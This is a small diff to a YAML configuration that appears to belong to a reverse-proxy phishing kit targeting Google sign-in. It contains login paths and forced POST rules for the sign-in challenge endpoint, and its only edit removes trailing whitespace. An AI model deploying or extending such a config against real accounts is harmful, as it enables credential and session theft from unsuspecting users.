@@ -61,7 +61,7 @@ login:
   path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 force_post:
   - path: '/_/signin/sl/challenge'
-    search: 
+    search:
       - {key: 'f.req', search: '.*'}
       - {key: 'continue', search: '.*'}
     force:
